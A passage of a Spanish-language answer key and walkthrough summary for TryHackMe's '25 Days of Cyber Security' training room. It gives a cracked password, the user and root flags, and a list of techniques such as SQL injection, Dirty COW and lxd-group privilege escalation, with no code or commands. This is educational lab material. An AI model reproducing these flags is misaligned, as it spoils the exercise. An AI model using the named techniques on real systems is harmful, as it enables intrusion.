| 9 | Accede a la base de datos y descubre las credenciales cifradas. ¿Cómo se llama la base de datos? | `tron` |
| 10 | Crackea la contraseña. ¿Cuál es? | `@computer@` |
| 11 | Conéctate por SSH con las credenciales obtenidas. | `No answer needed` |
| 12 | ¿Cuál es el valor de la flag user.txt? | `THM{IDENTITY_DISC_RECOGNISED}` |
| 13 | Revisa los grupos del usuario. ¿Qué grupo puede aprovecharse para escalar privilegios? | `lxd` |
| 14 | Abusa de este grupo para escalar a root. | `No answer needed` |
| 15 | ¿Cuál es el valor de la flag root.txt? | `THM{FLYNN_LIVES}` |

### Task 27: Próximos pasos

**Explicación:** Cierre de la sala: se invita a continuar el aprendizaje en los módulos y rutas (Pathways) de TryHackMe para seguir consolidando las habilidades vistas durante los 25 días.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Continúa tu aprendizaje en Hacktivities y Pathways de TryHackMe. | `No answer needed` |

---

**Metodología:** El reto se resuelve como un calendario de adviento: cada tarea introduce una habilidad nueva. Las tareas web se resuelven con manipulación de cookies (base64/hex/JSON), subida de archivos, fuzzing con wfuzz/gobuster, SQLi en el panel de Santa y XSS; los días de red usan Wireshark, Nmap, FTP anónimo y enum4linux; la escalada pasa por sudo, Tomcat (CVE-2019-0232) y Dirty COW; el día final combina un sitio tipo TRON con abuso del grupo lxd para escapar del contenedor.

**Learning chain:** cookies y codificación → subida de archivos → enumeración web → SQLi → XSS → análisis de tráfico → servicios de red → escalada de privilegios → OSINT → scripting → ingeniería inversa → forense Windows → ransomware → contenedores.

**MITRE ATT&CK:** T1087 (Account Discovery), T1190 (Exploit Public-Facing Application), T1213 (Data from Information Repositories), T1548 (Abuse Elevation Control Mechanism), T1587 (Develop Capabilities), T1059 (Command and Scripting Interpreter)

**Fuente:** [TryHackMe - 25 Days of Cyber Security](https://tryhackme.com/room/learncyberin25days)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
